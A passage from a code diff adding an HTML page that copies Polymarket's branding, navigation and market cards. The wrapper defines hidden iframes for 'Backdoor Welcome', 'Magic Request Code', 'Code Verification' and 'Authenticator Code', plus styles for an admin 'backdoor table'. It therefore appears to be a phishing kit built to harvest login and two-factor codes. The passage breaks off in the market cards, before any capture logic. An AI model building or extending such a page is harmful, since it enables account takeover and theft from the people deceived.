@@ -1,0 +1,3666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <!-- Prevent mobile zooming / keep page still on mobile -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+    <title>Polymarket | The World Largest Prediction Market™</title>
+    <style>
+        /* Container styles for the two pages (iframes) */
+        html, body {
+            height: 100%;
+            margin: 0;
+            touch-action: manipulation; /* prevent scrolling gestures that can cause zoom/pan */
+            -webkit-text-size-adjust: 100%; /* avoid mobile auto-zoom on inputs */
+        }
+        .frame {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100vh;
+            border: 0;
+            display: none;
+            background: white;
+        }
+        .frame.visible {
+            display: block;
+        }
+
+        /* Simple transition to avoid jarring switch */
+        .frame {
+            transition: opacity 220ms ease;
+            opacity: 1;
+        }
+
+        /* Prevent mobile pinch/zoom quirks by ensuring interactive elements have adequate font-size */
+        input, button, textarea, select {
+            font-size: 16px; /* avoids iOS zooming into form controls */
+            touch-action: manipulation;
+        }
+
+        /* Quick visual feedback for retry pending state in backdoor table (in admin frame) */
+        .pm-retry-pending {
+            background: rgba(255, 223, 0, 0.12);
+            color: #000;
+            font-weight: 600;
+        }
+
+        .pm-copied {
+            background: rgba(0,128,0,0.08);
+            transition: background 300ms ease;
+        }
+
+        /* copy toast style (host) */
+        .copy-toast {
+            position: fixed;
+            right: 16px;
+            bottom: 16px;
+            background: rgba(0,0,0,0.75);
+            color: #fff;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            z-index: 9999;
+            opacity: 0;
+            transition: opacity 200ms ease;
+        }
+
+        .copy-toast.show {
+            opacity: 1;
+        }
+    </style>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+</head>
+<body>
+    <!-- We will render page1 first (index) then switch to page2 (welcome).
+         The original files are embedded verbatim inside <script type="text/plain"> blocks.
+         We will not remove or alter any of the original lines — we only read them at runtime
+         and inject a small non-visual script into page1 to enable the "Log In" -> show welcome behavior.
+    -->
+
+    <!-- IFRAME placeholders -->
+    <iframe id="pageFrame1" class="frame visible" title="Polymarket Index"></iframe>
+    <iframe id="pageFrame2" class="frame" title="Polymarket Welcome"></iframe>
+    <!-- Additional (hidden) iframes that will host the backdoor_welcome page or magic page when navigated to -->
+    <iframe id="pageFrame3" class="frame" title="Backdoor Welcome"></iframe>
+    <iframe id="pageFrame4" class="frame" title="Magic Request Code"></iframe>
+    <!-- Verification frame (frame5) -->
+    <iframe id="pageFrame5" class="frame" title="Code Verification"></iframe>
+    <!-- Authenticator frame (frame6) -->
+    <iframe id="pageFrame6" class="frame" title="Authenticator Code"></iframe>
+
+    <!-- Original polymarket_index.html content (verbatim, preserved) -->
+    <script id="p1" type="text/plain">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Polymarket | The World Largest Prediction Market™</title>
+    <style>
+        /* Font import for Open Sauce Sans SemiBold */
+        @font-face {
+            font-family: 'Open Sauce Sans';
+            src: url('https://github.com/marcologous/Open-Sauce-Fonts/raw/master/fonts/OpenSauceSans-SemiBold.ttf') format('truetype');
+            font-weight: 600;
+            font-style: normal;
+            font-display: swap; /* ADDED: ensure fallback text renders immediately, then font swaps when loaded */
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            padding: 0 0.25cm;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, system-ui, "Inter", sans-serif;
+            background-color: #FFFFFF;
+            margin: 0;
+        }
+
+        .header {
+            background-color: white;
+            padding: 0.5cm 2.5cm 0.10cm 2.61cm;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 0.5rem;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-family: 'Open Sauce Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 22px;
+            font-weight: 600;
+            color: #000;
+            margin-right: 0;
+            display: inline-flex;
+            align-items: center;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            /* ADDED: show text immediately while custom font loads */
+            visibility: visible;
+        }
+
+        .search {
+            flex: 0 0 16.30cm;
+            height: 1.1cm;
+            margin-left: 0.5cm;
+            position: relative;
+            display: flex;
+            align-items: center;
+            background-color: #f3f5f8;
+            border-radius: 8px;
+            border: 1px solid #e6e8eb;
+            padding: 6px 12px;
+            gap: 10px;
+        }
+
+        .search .magnifier {
+            width: 22px;
+            height: 22px;
+            flex: 0 0 22px;
+            display: block;
+            color: #9ea7af;
+        }
+
+        .search input {
+            border: 0;
+            background: transparent;
+            outline: none;
+            font-size: 14px;
+            color: #6b7280;
+            width: 100%;
+            padding-right: 36px;
+            line-height: 1;
+            height: 100%;
+        }
+        .search input::placeholder{
+            color: #bfc7cc;
+        }
+
+        .search .slash {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #c7cbd0;
+            font-weight: 600;
+            pointer-events: none;
+            font-size: 14px;
+            padding: 0 6px;
+            border-radius: 6px;
+            background: transparent;
+        }
+
+        .how-it-works {
+            color: #1552EF;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-left: 0.50cm;
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 1;
+            font-family: Inter, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            white-space: nowrap;
+        }
+
+        .how-it-works svg.info {
+            width: 20px;
+            height: 20px;
+            display: inline-block;
+            vertical-align: middle;
+            flex-shrink: 0;
+        }
+
+        .right-header {
+            display: flex;
+            align-items: center;
+            gap: 13.75px;
+            margin-left: auto;
+            margin-right: 0.25cm;
+            transform: scale(0.9975);
+            transform-origin: right center;
+        }
+
+        .log-in {
+            color: #1552EF;
+            text-decoration: none;
+            white-space: nowrap;
+        }
+        .sign-up {
+            background-color: #1552EF;
+            color: white;
+            padding: 0;
+            height: 1.0cm;
+            width: 90px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            white-space: nowrap;
+        }
+        .menu {
+            font-size: 26.2px;
+            color: #495057;
+            line-height: 1;
+            letter-spacing: -1.4px;
+            font-weight: bold;
+            transform: scale(0.997);
+        }
+
+        .nav {
+            background-color: white;
+            padding: 0.12cm 2.5cm 0.12cm 3.21cm;
+            overflow: hidden;
+            white-space: nowrap;
+            border-bottom: 1px solid #e5e7eb;
+            position: fixed;
+            top: 1.6cm;
+            left: 0;
+            right: 0;
+            height: 2.0cm;
+            z-index: 99;
+        }
+
+        .nav-scroll {
+            display: flex;
+            overflow-x: auto;
+            overflow-y: hidden;
+            scroll-behavior: smooth;
+            scrollbar-width: none;
+            height: 100%;
+            -webkit-overflow-scrolling: touch;
+            scroll-snap-type: x mandatory;
+        }
+
+        .nav-scroll::-webkit-scrollbar {
+            display: none;
+        }
+
+        .nav a {
+            display: inline-flex;
+            align-items: center;
+            text-decoration: none;
+            color: #6b7280;
+            font-weight: 500;
+            font-size: 15px;
+            position: relative;
+            flex-shrink: 0;
+            scroll-snap-align: start;
+        }
+
+        .nav a:nth-child(1) {
+            margin-right: 0.5cm;
+            font-weight: 600;
+            gap: 8px;
+            color: #000000;
+        }
+
+        .nav a:nth-child(1) svg {
+            width: 0.50cm;
+            height: auto;
+            flex-shrink: 0;
+            color: #000000;
+        }
+
+        .nav a:nth-child(2) {
+            margin-right: 0.5cm;
+        }
+
+        .nav a:nth-child(3) {
+            margin-right: 1cm;
+        }
+
+        .nav a:nth-child(3)::after {
+            content: '';
+            position: absolute;
+            right: -0.5cm;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 1px;
+            height: 24px;
+            background-color: #d1d5db;
+        }
+
+        .nav a:nth-child(4) {
+            margin-right: 0.6cm;
+        }
+
+        .nav a:nth-child(n+5) {
+            margin-right: 0.6cm;
+        }
+
+        .nav a.active {
+            color: #007bff;
+        }
+
+        .nav-more {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            text-decoration: none;
+            color: #6b7280;
+            font-weight: 500;
+            font-size: 15px;
+            flex-shrink: 0;
+            margin-right: 0.5cm;
+            scroll-snap-align: start;
+        }
+
+        .nav-more svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .nav::before {
+            content: '';
+            position: absolute;
+            left: 3.21cm;
+            top: 0;
+            bottom: 0;
+            width: 2cm;
+            background: linear-gradient(to right, white, transparent);
+            pointer-events: none;
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .nav::after {
+            content: '';
+            position: absolute;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            width: 2.5cm;
+            background: linear-gradient(to left, white, transparent);
+            pointer-events: none;
+            z-index: 10;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+            margin-bottom: -0.50cm;
+        }
+
+        .nav-scroll.scrolled::before {
+            opacity: 1;
+        }
+
+        .nav-scroll.scrolled::after {
+            opacity: 0;
+        }
+
+        .sub-nav {
+            padding: 0.5cm 2.5cm 0.12cm 2.5cm;
+            display: flex;
+            overflow: hidden;
+            position: relative;
+            background-color: #FFFFFF;
+            height: auto;
+            margin-top: 3.6cm;
+        }
+
+        .sub-nav-scroll {
+            display: flex;
+            overflow-x: auto;
+            overflow-y: hidden;
+            scroll-behavior: smooth;
+            scrollbar-width: none;
+            gap: 0.5cm;
+            align-items: center;
+            flex: 1;
+            -webkit-overflow-scrolling: touch;
+            scroll-snap-type: x mandatory;
+        }
+
+        .sub-nav-scroll::-webkit-scrollbar {
+            display: none;
+        }
+
+        .sub-nav span {
+            color: #6b7280;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, system-ui, "Inter", sans-serif;
+            white-space: nowrap;
+            flex-shrink: 0;
+            scroll-snap-align: start;
+        }
+
+        .sub-nav span.active {
+            background-color: #dbeafe;
+            color: #1652EF;
+            padding: 6px 14px;
+            border-radius: 12px;
+            font-weight: 500;
+        }
+
+        .sub-nav-controls {
+            display: flex;
+            gap: 0.5cm;
+            align-items: center;
+            flex-shrink: 0;
+            position: relative;
+            z-index: 15;
+            margin-left: 0.5cm;
+        }
+
+        .sub-nav .search-icon {
+            width: 22px;
+            height: 22px;
+            flex: 0 0 22px;
+            display: block;
+            color: #000000;
+        }
+
+        .sub-nav .symbol {
+            color: #000000;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .sub-nav::before {
+            content: '';
+            position: absolute;
+            left: 2.5cm;
+            top: 0;
+            bottom: 0;
+            width: 1.5cm;
+            background: linear-gradient(to right, white, transparent);
+            pointer-events: none;
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .sub-nav::after {
+            content: '';
+            position: absolute;
+            right: 2.5cm;
+            top: 0;
+            bottom: 0;
+            width: 1.5cm;
+            background: linear-gradient(to left, white, transparent);
+            pointer-events: none;
+            z-index: 10;
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        .sub-nav-scroll.scrolled::before {
+            opacity: 1;
+        }
+
+        .sub-nav-scroll.scrolled::after {
+            opacity: 0;
+        }
+
+        .cards {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 11.43px;
+            padding: 20px 2.5cm;
+        }
+
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            border: 1px solid #E4E6E8;
+            box-shadow: none;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            font-weight: bold;
+        }
+
+        .card-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+            background-color: #e9ecef;
+            background-size: cover;
+            background-position: center;
+            overflow: hidden;
+        }
+
+        .card-options {
+            padding: 0 10px 10px;
+        }
+
+        .option {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 5px;
+            padding: 8px;
+            border-radius: 4px;
+            background-color: #f8f9fa;
+        }
+
+        .option-label {
+            flex: 1;
+        }
+
+        .option-percent {
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        .yes-btn {
+            background-color: #d4edda;
+            color: #155724;
+            padding: 5px 10px;
+            border-radius: 4px;
+            margin-right: 5px;
+        }
+
+        .no-btn {
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 5px 10px;
+            border-radius: 4px;
+        }
+
+        .volume {
+            padding: 10px;
+            font-size: 12px;
+            color: #6c757d;
+        }
+
+        .live {
+            background-color: #dc3545;
+            color: white;
+            border-radius: 50%;
+            padding: 2px 6px;
+            font-size: 10px;
+            margin-right: 5px;
+        }
+
+        .new-tag {
+            background-color: #ffc107;
+            color: #212529;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+
+        .up-down {
+            display: flex;
+            gap: 0.10cm;
+            margin-top: 2cm;
+        }
+
+        .up-btn {
+            background-color: #d4edda;
+            flex: 1;
+            text-align: center;
+            padding: 8px;
+            border-radius: 4px;
+        }
+
+        .down-btn {
+            background-color: #f8d7da;
+            flex: 1;
+            text-align: center;
+            padding: 8px;
+            border-radius: 4px;
+        }
+
+        .percent-circle {
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        .show-more {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #6b7280;
+            cursor: pointer;
+            margin-top: 0.5cm;
+        }
+
+        .footer {
+            background-color: #FFFFFF;
+            padding: 40px 2.5cm 20px 2.5cm;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: 'Open Sauce Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 22px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 8px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .footer-logo svg {
+            width: 30px;
+            height: 30px;
+            flex-shrink: 0;
+        }
+
+        .footer-tagline {
+            font-size: 14px;
+            color: #6b7280;
+            margin-bottom: 40px;
+            font-weight: 500;
+        }
+
+        .footer-sections {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 60px;
+            margin-bottom: 40px;
+        }
+
+        .section h3 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #000;
+            margin: 0 0 20px 0;
+        }
+
+        .section > div {
+            font-size: 14px;
+            color: #6b7280;
+            margin-bottom: 10px;
+            cursor: pointer;
+            line-height: 1.6;
+        }
+
+        .markets .sub-columns {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 20px;
+        }
+
+        .sub-column div {
+            font-size: 14px;
+            color: #6b7280;
+            margin-bottom: 8px;
+            cursor: pointer;
+        }
+
+        .sub-column div:nth-child(odd) {
+            font-weight: 500;
+            color: #000;
+        }
+
+        .footer-divider {
+            height: 1px;
+            background-color: #e5e7eb;
+            margin-bottom: 20px;
+        }
+
+        .footer-bottom {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+            font-size: 13px;
+            color: #6b7280;
+            line-height: 1.6;
+        }
+
+        .footer-bottom-left {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .copyright {
+            font-size: 13px;
+            color: #6b7280;
+        }
+
+        .copyright a {
+            color: #1552EF;
+            text-decoration: none;
+        }
+
+        .social-icons {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            font-size: 13px;
+        }
+
+        .social-icons span {
+            cursor: pointer;
+        }
+
+        .footer-bottom-right {
+            font-size: 13px;
+            color: #6b7280;
+            line-height: 1.6;
+        }
+
+        .footer-bottom-right a {
+            color: #1552EF;
+            text-decoration: none;
+        }
+
+        /* MOBILE RESPONSIVE STYLES */
+        @media (max-width: 768px) {
+            body {
+                padding: 0;
+            }
+
+            .header {
+                padding: 0.5cm 1cm 0.10cm 1cm;
+                gap: 0.3rem;
+            }
+
+            .logo {
+                font-size: 18px;
+            }
+
+            .search {
+                display: none;
+            }
+
+            .how-it-works {
+                display: none;
+            }
+
+            .right-header {
+                gap: 10px;
+                margin-left: auto;
+                margin-right: 0;
+                transform: scale(1);
+            }
+
+            .log-in {
+                font-size: 13px;
+            }
+
+            .sign-up {
+                width: 70px;
+                height: 0.85cm;
+                font-size: 12px;
+            }
+
+            .menu {
+                display: none;
+            }
+
+            .nav {
+                padding: 0.12cm 1cm 0.12cm 1cm;
+                top: 1.3cm;
+                height: 1.8cm;
+            }
+
+            .nav a {
+                font-size: 13px;
+                margin-right: 0.4cm !important;
+            }
+
+            .nav a:nth-child(1) {
+                gap: 6px;
+            }
+
+            .nav a:nth-child(1) svg {
+                width: 0.4cm;
+            }
+
+            .nav a:nth-child(3)::after {
+                display: none;
+            }
+
+            .nav-more {
+                display: none;
+            }
+
+            .sub-nav {
+                padding: 0.5cm 1cm 0.12cm 1cm;
+                margin-top: 3.1cm;
+            }
+
+            .sub-nav-scroll {
+                gap: 0.3cm;
+            }
+
+            .sub-nav span {
+                font-size: 12px;
+            }
+
+            .sub-nav-controls {
+                display: none;
+            }
+
+            .cards {
+                grid-template-columns: 1fr;
+                gap: 10px;
+                padding: 15px 1cm;
+            }
+
+            .card {
+                border-radius: 6px;
+            }
+
+            .card-header {
+                padding: 8px;
+                font-size: 14px;
+            }
+
+            .card-icon {
+                width: 35px;
+                height: 35px;
+                margin-right: 8px;
+            }
+
+            .card-options {
+                padding: 0 8px 8px;
+            }
+
+            .option {
+                padding: 6px;
+                margin-bottom: 4px;
+                font-size: 13px;
+            }
+
+            .yes-btn,
+            .no-btn {
+                padding: 4px 8px;
+                font-size: 12px;
+            }
+
+            .volume {
+                padding: 8px;
+                font-size: 11px;
+            }
+
+            .up-down {
+                gap: 0.08cm;
+                margin-top: 1.5cm;
+            }
+
+            .up-btn,
+            .down-btn {
+                padding: 6px;
+                font-size: 12px;
+            }
+
+            .show-more {
+                padding: 15px;
+                font-size: 13px;
+                margin-top: 0.3cm;
+            }
+
+            .footer {
+                padding: 30px 1cm 15px 1cm;
+            }
+
+            .footer-logo {
+                font-size: 18px;
+                margin-bottom: 6px;
+            }
+
+            .footer-logo svg {
+                width: 25px;
+                height: 25px;
+            }
+
+            .footer-tagline {
+                font-size: 12px;
+                margin-bottom: 25px;
+            }
+
+            .footer-sections {
+                grid-template-columns: 1fr;
+                gap: 30px;
+                margin-bottom: 25px;
+            }
+
+            .section h3 {
+                font-size: 14px;
+                margin-bottom: 15px;
+            }
+
+            .section > div {
+                font-size: 13px;
+                margin-bottom: 8px;
+            }
+
+            .markets .sub-columns {
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+
+            .footer-bottom {
+                grid-template-columns: 1fr;
+                gap: 20px;
+                font-size: 12px;
+            }
+
+            .copyright {
+                font-size: 12px;
+            }
+
+            .social-icons {
+                font-size: 12px;
+                gap: 10px;
+            }
+
+            .footer-bottom-right {
+                font-size: 12px;
+            }
+        }
+
+        @media (min-width: 769px) and (max-width: 1024px) {
+            .cards {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (min-width: 1025px) and (max-width: 1440px) {
+            .cards {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <svg width="30" height="30" viewBox="0 0 250 300" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg" style="margin-right:8px; display:inline-block; vertical-align:middle; background-color:#FFFFFF;">
+                <g transform="translate(20.715, 10)">
+                    <polygon points="0,70 208.57,0 208.57,280 0,210" style="fill:black; stroke:black; stroke-width:2" />
+                    <polygon points="20,84.395 188.57,27.925 188.57,252.075 20,195.605" style="fill:white; stroke:none" />
+                    <polygon points="0,70 208.57,140 208.57,161.095 0,91.095" style="fill:black; stroke:none" />
+                    <polygon points="0,199.452 208.57,129.452 208.57,150.547 15.715,215.271" style="fill:black; stroke:none" />
+                    <line x1="0" y1="70" x2="208.57" y2="140" style="stroke:black; stroke-width:2" />
+                    <line x1="0" y1="199.452" x2="208.57" y2="129.452" style="stroke:black; stroke-width:2" />
+                    <line x1="20" y1="63.29" x2="20" y2="216.71" style="stroke:black; stroke-width:2" />
+                    <line x1="188.57" y1="6.71" x2="188.57" y2="273.29" style="stroke:black; stroke-width:2" />
+                    <line x1="0" y1="91.095" x2="208.57" y2="21.095" style="stroke:black; stroke-width:2" />
+                    <line x1="0" y1="188.905" x2="208.57" y2="258.905" style="stroke:black; stroke-width:2" />
+                    <line x1="0" y1="91.095" x2="208.57" y2="161.095" style="stroke:black; stroke-width:2" />
+                    <line x1="15.715" y1="215.271" x2="208.57" y2="150.547" style="stroke:black; stroke-width:2" />
+                </g>
+            </svg>
+            Polymarket
+        </div>
+
+        <div class="search" aria-label="Search polymarket">
+            <svg class="magnifier" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="11" cy="11" r="5.7" stroke="#9ea7af" stroke-width="1.3" fill="none" />
+                <path d="M20.5 20.5L16 16" stroke="#9ea7af" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <input type="text" placeholder="Search polymarket" aria-label="Search polymarket" />
+            <div class="slash">/</div>
+        </div>
+
+        <a href="#" class="how-it-works" aria-label="How it works">
+            <svg class="info" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true">
+                <circle cx="12" cy="12" r="9" fill="#1552EF"/>
+                <rect x="11" y="10" width="2" height="5" rx="1" fill="#fff"/>
+                <circle cx="12" cy="7.5" r="1" fill="#fff"/>
+            </svg>
+            How it works
+        </a>
+
+        <div class="right-header">
+            <a href="#" class="log-in">Log In</a>
+            <button class="sign-up">Sign Up</button>
+            <div class="menu">☰</div>
+        </div>
+    </div>
+
+    <div class="nav">
+        <div class="nav-scroll" id="navScroll">
+            <a href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-arrow-wave-right-up"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M17 10h4v4" /><path d="M3 12c.887 -1.284 2.48 -2.033 4 -2c1.52 -.033 3.113 .716 4 2s2.48 2.033 4 2c1.52 .033 3 -1 4 -2l2 -2" /></svg>
+                Trending
+            </a>
+            <a href="#">Breaking</a>
+            <a href="#">New</a>
+            <a href="#">Politics</a>
+            <a href="#">Sports</a>
+            <a href="#">Crypto</a>
+            <a href="#">Finance</a>
+            <a href="#">Geopolitics</a>
+            <a href="#">Earnings</a>
+            <a href="#">Tech</a>
+            <a href="#">Culture</a>
+            <a href="#">World</a>
+            <a href="#">Economy</a>
+            <a href="#">Climate & Science</a>
+            <a href="#">Elections</a>
+            <a href="#">Mentions</a>
+            <a href="#" class="nav-more">
+                More
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <polyline points="6 9 12 15 18 9"></polyline>
+                </svg>
+            </a>
+        </div>
+    </div>
+
+    <div class="sub-nav">
+        <div class="sub-nav-scroll" id="subNavScroll">
+            <span class="active">All</span>
+            <span>Trump</span>
+            <span>NBA All-Star Game</span>
+            <span>Olympics</span>
+            <span>Starmer</span>
+            <span>Iran</span>
+            <span>Epstein</span>
+            <span>IPOs</span>
+            <span>Big Game</span>
+            <span>Tweet Markets</span>
+            <span>Gov Shutdown</span>
+            <span>SpaceX</span>
+            <span>Derivatives</span>
+            <span>Bangladesh Election</span>
+            <span>Earnings</span>
+            <span>Greenland</span>
+            <span>Tariffs</span>
+            <span>AI</span>
+            <span>Weather</span>
+        </div>
+        <div class="sub-nav-controls">
+            <span class="symbol">></span>
+            <svg class="search-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="11" cy="11" r="5.7" stroke="#000000" stroke-width="1.3" fill="none" />
+                <path d="M20.5 20.5L16 16" stroke="#000000" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+        </div>
+    </div>
+
+    <div class="cards">
+        <!-- Card 1: Fed decision -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://img.youtube.com/vi/fAvtAkqttKw/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Fed decision in March?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">50+ bps decrease</span>
+                    <span class="option-percent">1%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">25 bps decrease</span>
+                    <span class="option-percent">18%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$96m Vol. ~ Monthly</div>
+        </div>
+
+        <!-- Card 2: US strikes Iran -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/Q3nJn1BOa4Q/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                US strikes Iran by...?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">February 13</span>
+                    <span class="option-percent">2%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">February 20</span>
+                    <span class="option-percent">11%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$241m Vol. ~ Monthly</div>
+        </div>
+
+        <!-- Card 3: BTC 15 Minute -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/C0juBzyyrlg/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                BTC 15 Minute Up or Down
+            </div>
+            <div class="card-options">
+                <div class="up-down">
+                    <span class="up-btn">Up</span>
+                    <span class="down-btn">Down</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Card 4: Bitcoin price February -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/C0juBzyyrlg/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                What price will Bitcoin hit in February?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">150,000</span>
+                    <span class="option-percent">&lt;1%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">125,000</span>
+                    <span class="option-percent">&lt;1%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$33m Vol. ~ Monthly</div>
+        </div>
+
+        <!-- Card 5: Winter Olympics -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/lNUoAiJutjg/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                2026 Winter Olympics: Most Gold Medals
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">Norway</span>
+                    <span class="option-percent">84%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">United States</span>
+                    <span class="option-percent">13%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$9m Vol.</div>
+        </div>
+
+        <!-- Card 6: Pacers vs Knicks -->
+        <div class="card">
+            <div class="card-header">
+                IND Pacers
+            </div>
+            <div class="card-options">
+                <div class="option" style="background-color: #ffeeba;">
+                    <span class="option-label">Pacers</span>
+                    <span class="option-percent">23%</span>
+                </div>
+                <div class="option" style="background-color: #fd7e14;">
+                    <span class="option-label">Knicks</span>
+                    <span class="option-percent">77%</span>
+                </div>
+            </div>
+            <div class="volume">Q2 - 1:10 $6m Vol. NBA</div>
+        </div>
+
+        <!-- Card 7: Spurs vs Lakers -->
+        <div class="card">
+            <div class="card-header">
+                SAS Spurs
+            </div>
+            <div class="card-options">
+                <div class="option" style="background-color: #6f42c1;">
+                    <span class="option-label">Spurs</span>
+                    <span class="option-percent">17%</span>
+                </div>
+                <div class="option" style="background-color: #ffc107;">
+                    <span class="option-label">Lakers</span>
+                    <span class="option-percent">83%</span>
+                </div>
+            </div>
+            <div class="volume">$4m Vol. NBA • 7:30 PM</div>
+        </div>
+
+        <!-- Card 8: Starmer out -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-icon" style="background-image: url('https://i.ytimg.com/vi/6yrJkGM-Dno/maxresdefault.jpg'); background-position: center; background-size: cover;"></div>
+                Starmer out by...?
+            </div>
+            <div class="card-options">
+                <div class="option">
+                    <span class="option-label">February 28</span>
+                    <span class="option-percent">8%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+                <div class="option">
+                    <span class="option-label">March 31</span>
+                    <span class="option-percent">23%</span>
+                    <span class="yes-btn">Yes</span>
+                    <span class="no-btn">No</span>
+                </div>
+            </div>
+            <div class="volume">$5m Vol.</div>
+        </div>
+
+        <!-- Card 9: Republican Presidential Nominee 2028 -->
+        <div class="card">
+            <div class="card-header">
